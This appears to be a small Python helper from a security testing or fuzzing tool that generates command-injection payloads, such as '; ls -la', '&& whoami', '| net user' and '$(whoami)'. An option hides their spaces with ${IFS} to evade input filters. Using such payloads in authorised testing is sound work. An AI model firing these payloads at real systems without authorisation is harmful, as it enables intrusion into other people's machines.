def generate_cmd_payloads(obfuscate=False):
    payloads = [
        "; ls -la",
        "&& whoami",
        "| net user",
        "`id`",
        "$(whoami)"
    ]
    if obfuscate:
        payloads = [p.replace(" ", "${IFS}") for p in payloads]
    return payloads